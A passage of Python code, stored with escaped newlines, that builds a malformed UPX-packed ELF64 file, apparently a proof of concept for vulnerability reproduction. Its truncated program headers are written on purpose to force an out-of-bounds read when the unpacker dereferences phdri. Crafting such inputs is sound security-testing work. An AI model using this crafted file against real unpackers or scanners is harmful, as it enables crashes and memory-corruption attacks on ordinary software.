# But we\'ll make the actual file smaller or structure it so that\n    # when phdri is dereferenced, it goes OOB\n    \n    # Position for l_info (UPX overlay info)\n    overlay_offset = 0x180  # arbitrary position\n    \n    # Pad to overlay_offset - sizeof(l_info)\n    current_pos = f.tell()\n    pad_size = overlay_offset - 12 - current_pos  # 12 = sizeof(l_info)\n    if pad_size > 0:\n        f.write(b"\\x00" * pad_size)\n    \n    # Write l_info structure\n    f.write(b"UPX!")  # l_magic (4 bytes)\n    f.write(struct.pack("<H", 12))  # l_lsize\n    f.write(struct.pack("<B", 14))  # l_version\n    f.write(struct.pack("<B", 0x0e))  # l_format (linux/elf64)\n    f.write(struct.pack("<I", 0))   # l_checksum\n    \n    # Write p_info structure\n    f.write(struct.pack("<I", 800))  # p_filesize\n    f.write(struct.pack("<I", 4096))  # p_blocksize\n    \n    # Write b_info structure\n    sz_unc = len(inner_data)\n    sz_cpr = len(compressed_inner)\n    f.write(struct.pack("<I", sz_unc))  # sz_unc\n    f.write(struct.pack("<I", sz_cpr))  # sz_cpr\n    f.write(struct.pack("<B", 0))       # b_cto8\n    f.write(struct.pack("<B", 0))       # b_unused\n    f.write(struct.pack("<H", 0))       # padding\n    \n    # Write compressed inner ELF data\n    f.write(compressed_inner)\n    \n    # Now pad to e_phoff, but write LESS data than needed for e_phnum entries\n    # This causes the buffer to be too small for all phdrs\n    current_pos = f.tell()\n    if current_pos < e_phoff:\n        f.write(b"\\x00" * (e_phoff - current_pos))\n    \n    # Write only PARTIAL program headers (not enough for e_phnum=3)\n    # Write only 1.5 phdrs worth of data (84 bytes instead of 168)\n    # This ensures the second/third phdr access will be OOB\n    f.write(struct.pack("<I", 1))       # p_type: PT_LOAD\n    f.write(struct.pack("<I", 5))       # p_flags\n    f.write(struct.pack("<Q", 0))       # p_offset\n    f.write(struct.pack("<Q", 0x400000))  # p_vaddr\n    f.write(struct.pack("<Q", 0x400